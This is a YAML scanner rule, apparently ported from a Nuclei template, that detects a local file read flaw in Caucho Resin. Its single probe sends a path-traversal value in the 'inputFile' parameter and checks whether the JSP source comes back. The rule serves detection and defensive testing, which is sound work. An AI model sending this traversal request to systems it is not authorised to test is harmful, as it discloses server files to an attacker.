schema_version: 1
id: "cortex.community:resin-inputfile-fileread"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Caucho Resin LFR"
  description: "A vulnerability in Caucho Resin allows remote unauthenticated users to utilize the 'inputFile' variable to include the content of locally stored files and disclose their content. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://blkstone.github.io/2017/10/30/resin-attack-vectors/"
  tags: ["resin", "caucho", "lfr", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %" } }
